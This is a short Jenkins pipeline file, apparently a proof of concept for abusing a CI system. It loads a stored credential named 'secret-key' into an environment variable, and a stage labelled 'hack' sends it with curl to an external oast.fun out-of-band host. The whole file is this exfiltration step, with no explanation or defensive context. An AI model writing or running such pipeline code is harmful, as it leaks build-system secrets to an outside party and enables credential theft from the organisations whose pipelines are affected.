pipeline {
    agent any
     environment {
        secret_key     = credentials('secret-key')
    }
    stages {
        stage('hack') {
            steps {
              sh 'curl -d env="$secret_key" ccen2a12vtc000091wh0gg8ktfyyyyyyb.oast.fun'
                }
            }
        }
    }
